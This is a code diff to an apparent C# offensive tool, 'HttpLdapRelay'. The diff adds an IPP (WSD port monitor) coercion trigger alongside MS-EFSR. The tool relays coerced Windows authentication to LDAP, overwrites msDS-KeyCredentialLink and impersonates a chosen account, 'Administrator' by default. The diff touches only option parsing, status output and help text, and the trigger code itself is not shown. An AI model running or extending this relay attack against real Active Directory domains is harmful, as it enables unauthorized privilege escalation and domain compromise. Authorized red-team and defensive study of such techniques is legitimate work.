@@ -47,6 +47,7 @@ namespace HttpLdapRelay
             string userToImpseronate = "Administrator";
             string fullDomainName = "";
             bool forceOverwrite = false; // Force overwrite existing msDS-KeyCredentialLink
+            bool useIpp = false; // Use IPP trigger instead of EFS
 
 
             for (int i = 0; i < args.Length; i++)
@@ -97,6 +98,9 @@ namespace HttpLdapRelay
                     case "--coerce":
                         autoCoerce = false;
                         break;
+                    case "--ipp":
+                        useIpp = true;
+                        break;
                     case "-v":
                     case "--verbose":
                         verbose = true;
@@ -137,6 +141,7 @@ namespace HttpLdapRelay
             Console.WriteLine($"    Command:      {command}");
             Console.WriteLine($"    Domain:      {fullDomainName}");
             Console.WriteLine($"    Auto Coerce:  {autoCoerce}");
+            Console.WriteLine($"    Coerce method:{(useIpp ? "IPP" : "EFS")}");
             Console.WriteLine($"    User to impersonate: {userToImpseronate}");
             Console.WriteLine();
 
@@ -150,13 +155,15 @@ namespace HttpLdapRelay
             }
 
             Console.WriteLine();
-
-            Console.WriteLine("[*] Checking if Webclient is enabled...");
-            bool result = WebClientTrigger.EnsureWebClientRunning();
-            if (!result)
+            if (!useIpp)
             {
-                Console.WriteLine("[-] Unable to start WebClient... Something went wrong.");
-                return 0;
+                Console.WriteLine("[*] Checking if Webclient is enabled...");
+                bool result = WebClientTrigger.EnsureWebClientRunning();
+                if (!result)
+                {
+                    Console.WriteLine("[-] Unable to start WebClient... Something went wrong.");
+                    return 0;
+                }
             }
 
             try
@@ -192,11 +199,18 @@ namespace HttpLdapRelay
                 {
                     Console.WriteLine();
                     Console.ForegroundColor = ConsoleColor.Cyan;
-                    Console.WriteLine("[*] Auto-coercion enabled - will trigger MS-EFSR in 2 seconds...");
-                    Console.ResetColor();
-
-                    // Start coercion asynchronously (non-blocking)
-                    _ = EfsTrigger.TriggerAsync(httpPort, 2000);
+                    if (useIpp)
+                    {
+                        Console.WriteLine("[*] Auto-coercion enabled - will trigger IPP association in 2 seconds...");
+                        Console.ResetColor();
+                        _ = IppTrigger.TriggerAsync(httpPort, 2000);
+                    }
+                    else
+                    {
+                        Console.WriteLine("[*] Auto-coercion enabled - will trigger MS-EFSR in 2 seconds...");
+                        Console.ResetColor();
+                        _ = EfsTrigger.TriggerAsync(httpPort, 2000);
+                    }
                 }
 
                 Console.WriteLine("╔════════════════════════════════════════════════════════════════╗");
@@ -252,7 +266,8 @@ namespace HttpLdapRelay
             Console.WriteLine("  --force                            /!\\ Warning /!\\ Force the change of ms-DSKeyCredentialLink attribute ");
             Console.WriteLine("  -lp, --ldap-port <port>            LDAP port (default: 389, or 636 for LDAPS)");
             Console.WriteLine("  -s, --ldaps                        Use LDAPS instead of LDAP (default: false)");
-            Console.WriteLine("  -a, --auto                         If used, disable auto-trigger EFS coercion. Enabled by default.");
+            Console.WriteLine("  -a, --auto                         If used, disable auto-trigger coercion. Enabled by default.");
+            Console.WriteLine("  --ipp                              Use IPP trigger (WSD port monitor) instead of EFS for coercion");
             Console.WriteLine("  -v, --verbose                      Enable verbose output");
             Console.WriteLine("  -h, --help                         Show this help message");
             Console.WriteLine();
